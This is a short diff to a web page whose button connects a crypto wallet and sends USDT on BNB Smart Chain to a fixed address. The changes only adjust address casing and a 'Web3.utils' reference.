@@ -8,7 +8,7 @@
   <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiverAddress = "0xc64087a6Fd263ab6A140F9b46f4cAF7B3e82147f".trim();
+    const receiverAddress = "0xc64087a6Fd263ab6A140F9b46f4cAF7B3e82147f".trim().toLowerCase();
     const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT on BSC
 
     const usdtAbi = [
@@ -40,7 +40,7 @@
           const sender = accounts[0];
 
           // Validate address format
-          if (!web3.utils.isAddress(receiverAddress)) {
+          if (!Web3.utils.isAddress(receiverAddress)) {
             alert("Invalid receiver address format.");
             return;
           }
